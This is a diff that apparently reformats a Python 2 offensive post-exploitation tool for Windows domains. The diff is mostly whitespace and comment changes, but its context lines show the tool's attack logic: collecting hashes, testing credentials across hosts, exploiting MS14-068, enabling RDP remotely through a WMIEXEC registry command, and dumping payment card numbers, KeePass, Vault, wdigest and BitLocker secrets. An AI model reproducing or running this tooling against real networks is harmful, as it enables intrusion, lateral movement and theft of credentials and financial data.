                 tmpdomain = 'WORKGROUP'
-            #print "domain : "+tmpdomain
+            # print "domain : "+tmpdomain
             if [tmpip, tmpdomain, tmpusername, tmphash] not in userHashList:
                 userHashList.append([tmpip, tmpdomain, tmpusername, tmphash])
         else:
@@ -5195,8 +5268,7 @@ parser.add_argument(
     "-s",
     '--skip',
     action='store_true',
-    help=
-    "Skip Lateral Movement/Privilege Escalation.  Only run POST exploitation modules"
+    help="Skip Lateral Movement/Privilege Escalation.  Only run POST exploitation modules"
 )
 parser.add_argument('-L',
                     '--list-modules',
@@ -5283,7 +5355,7 @@ if args.username:
     username = args.username
 if args.password:
     password = args.password
-#if not args.domain or not args.username or not args.password:
+# if not args.domain or not args.username or not args.password:
 if not args.username or not args.password:
     print(setColor(
         "[!]", bold,
@@ -5342,9 +5414,8 @@ web_dir = os.getcwd() + "/modules"
 os.chdir(web_dir)
 threading.Thread(target=my_tcp_server).start()
 
-#updateMimiStaging()
+# updateMimiStaging()
 
-import resource
 
 resource.setrlimit(resource.RLIMIT_NOFILE, (1024, 3000))
 screenLock = threading.Semaphore(value=3)
@@ -5396,9 +5467,9 @@ passwordHash = None
 
 cleanUp()
 for x in nbList:
-    #testAccount
-    #tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
-    #if tmpAdminOK==True:
+    # testAccount
+    # tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
+    # if tmpAdminOK==True:
     if testAccount(x, domain, username, password, passwordHash) == True:
         if [x, domain, username, password] not in accessAdmHostList:
             accessAdmHostList.append([x, domain, username, password])
@@ -5406,11 +5477,11 @@ for x in dcList:
     if testAccount(x, domain, username, password, passwordHash) == True:
         if [x, domain, username, password] not in accessAdmHostList:
             accessAdmHostList.append([x, domain, username, password])
-    #tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
-    #if tmpAdminOK==True:
+    # tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
+    # if tmpAdminOK==True:
     #    if [x, domain, username, password] not in accessAdmHostList:
     #        accessAdmHostList.append([x, domain, username, password])
-#print "\n"
+# print "\n"
 
 if skipMode == False:
     if len(dcList) > 0:
@@ -5647,10 +5718,10 @@ if skipMode == False:
                     if y not in userPassList:
                         userPassList.append(y)
         if isDA == False and dcCompromised == False:
-            #if domain==None or len(domain)<1:
+            # if domain==None or len(domain)<1:
             #    domain="WORKGROUP"
             #print (setColor("\nChecking SYSVOL for Credentials", color="green"))
-            #mountSysvol(username,password)
+            # mountSysvol(username,password)
             if optionMS14068 == True:
                 tmpPassList, tmpHashList = testMS14_068(
                     ip, domain, username, password, passwordHash)
@@ -5755,7 +5826,7 @@ if skipMode == False:
                                 tmpusername = ((x[2]).lower()).strip()
                                 tmppassword = x[3]
                                 tmppasswordHash = None
-                                #if (tmpusername.lower()).strip()=="administrator":
+                                # if (tmpusername.lower()).strip()=="administrator":
                                 if len(
                                         tmppassword
                                 ) > 0 and tmppassword != '(null)' and tmpusername != "guest":
@@ -5905,7 +5976,7 @@ if skipMode == False:
                             [tmpip, tmpdomain, tmpusername, tmppassword])
 
             print tabulate(userPassList1)
-            #analyzePasswords(userPassList)
+            # analyzePasswords(userPassList)
 
         print(setColor("\nList of Hashes in Database", bold, color="green"))
         if len(userHashList) < 1:
@@ -5953,7 +6024,8 @@ if skipMode == False:
                         passwordHash = None
                     if ip not in rdpList:
                         print "Enabling RDP on Host: " + ip
-                        command = powershellCmdStart + " -Command \"set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name \"fDenyTSConnections\" -Value 0\""
+                        command = powershellCmdStart + \
+                            " -Command \"set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name \"fDenyTSConnections\" -Value 0\""
                         results, status = runWMIEXEC(ip, domain, username,
                                                      password, passwordHash,
                                                      command)
@@ -6026,14 +6098,14 @@ if args.module == 'files':
                                 "[+]", bold,
                                 color="green")) + " " + ip + ":445 | " + (
                                     setColor("[download]", bold, color="green")
-                                ) + " | " + filename + " | " + tmpFilename
+                            ) + " | " + filename + " | " + tmpFilename
 
                         else:
                             print(setColor(
                                 "[+]", bold,
                                 color="green")) + " " + ip + ":445 | " + (
                                     setColor("[download]", bold, color="green")
-                                ) + " | " + filename + " | " + tmpFilename
+                            ) + " | " + filename + " | " + tmpFilename
                         if "unattend.xml" in filename.lower(
                         ) or "sysprep.xml" in filename.lower():
                             tmpResultList = parseUnattendXML(tmpFilename)
@@ -6079,7 +6151,7 @@ if args.module == "mssqlshell":
         if len(tmpResultList) > 0:
             print tmpResultList
             #tmpFooter=(setColor("[+]", bold, color="green"))+" "+hostNo+":445 | sa:"+password+" | "+(setColor("[MSSQL] [Bruteforce|Found Account]", bold, color="green"))
-            #print tmpFooter
+            # print tmpFooter
 
 if args.module == 'wdigest':
     for x in nbList:
@@ -6154,9 +6226,9 @@ if args.module == "pan":
                         else:
                             if "----------------" not in x:
                                 tmpCardNoList.append(x)
-                        #if "---------------------" not in x:
+                        # if "---------------------" not in x:
                         #    tmpList1.append(x)
-                        #else:
+                        # else:
                         #    tmpResultList.append([tmpFilename," ".join(tmpList1)])
                         #    found=False
                         #    tmpList1=[]
@@ -6174,9 +6246,9 @@ if args.module == "pan":
             print setColor("[+]", bold,
                            color="green") + " " + tmpIP + ":445 | " + (
                                setColor("[PAN] ", bold, color="green")
-                           ) + tmpFilename + " | " + ", ".join(tmpCardNoList)
+            ) + tmpFilename + " | " + ", ".join(tmpCardNoList)
 
-    #if len(tmpResultList)>0:
+    # if len(tmpResultList)>0:
     #    for x in tmpResultList:
     #        print "here: "+str(x)
     #    #print tabulate(tmpResultList,tablefmt="simple")
@@ -6198,7 +6270,7 @@ if args.module == "pan":
             tmpResultList1 = []
             tmpResultList2 = tmpResultList.split("\n")
             for y in tmpResultList2:
-                #for y in str(tmpResultList):
+                # for y in str(tmpResultList):
                 if len(y) > 0:
                     y = (y.split(",")[0]).replace('"', '')
                     if [y, ip] not in tmpResultList1:
@@ -6274,7 +6346,7 @@ if args.module == "pan":
         os._exit(1)
 
 if args.module == 'shares':
-    #python ms14_068.py 172.16.126.0/24 -d corp -u milo -p Password1 -M shares -o host=172.16.126.176
+    # python ms14_068.py 172.16.126.0/24 -d corp -u milo -p Password1 -M shares -o host=172.16.126.176
     svrFilterList = []
     if args.module_options:
         if "host=" in args.module_options[0]:
@@ -6413,9 +6485,9 @@ if args.module == 'reg':
     if len(tmpResultList) > 0:
         for x in tmpResultList:
             targetIP = x[0]
-            #tmpDomain="domain"
-            #tmpUsername="milo"
-            #tmpPassword="Password1"
+            # tmpDomain="domain"
+            # tmpUsername="milo"
+            # tmpPassword="Password1"
             tmpRegPath = x[1]
             tmpCred = x[2]
             print(
@@ -6426,7 +6498,7 @@ if args.module == 'reg':
             #(setColor(" | "+tmpRegPath, bold, color="green"))
 
         #headers = ["Host","Reg Path", "Password/Hash"]
-        #print tabulate(tmpResultList,headers)
+        # print tabulate(tmpResultList,headers)
     os._exit(0)
 
 if args.module == 'route':
@@ -6478,7 +6550,7 @@ if args.module == 'keepass':
                 setColor("[+]", bold, color="green")
             ) + " " + targetIP + ":445 | " + domain + "\\" + username + ":" + password + " | " + (
                 setColor("[keepass] ", bold, color="green")) + "| " + x[1]
-    #else:
+    # else:
     #    print "No results found"
     os._exit(1)
 
@@ -6606,12 +6678,12 @@ if args.module == "passwords":
             password = x[3]
             passwordHash = None
         results = sessionGopher(ip, domain, username, password, passwordHash)
-        #for y in results:
+        # for y in results:
         #    if len(y)>0:
         #        tmpResultList.append(y)
-    #if len(tmpResultList)>0:
+    # if len(tmpResultList)>0:
     #    print tabulate(tmpResultList,tablefmt="simple")
-    #else:
+    # else:
     #    print "No results found"
 
     print(setColor("\nFind Interesting Registry Keys", bold, color="green"))
@@ -6728,7 +6800,7 @@ if args.module == "passwords":
     if len(tmpResultList) > 0:
         headers = ["IP", "Bitlocker Keys"]
         print tabulate(tmpResultList, headers, tablefmt="simple")
-    #else:
+    # else:
     #    print "No results found"
 
     print(setColor("\nDumping Keepass Passwords", bold, color="green"))
@@ -6817,7 +6889,7 @@ if args.module == "passwords":
         tmpDoneList.append(x[0])
     if len(tmpResultList) > 0:
         print tabulate(tmpResultList, tablefmt="simple")
-    #else:
+    # else:
     #    print "No results found"
 
     print setColor('\nWindows Vault Credentials', bold, color='green')
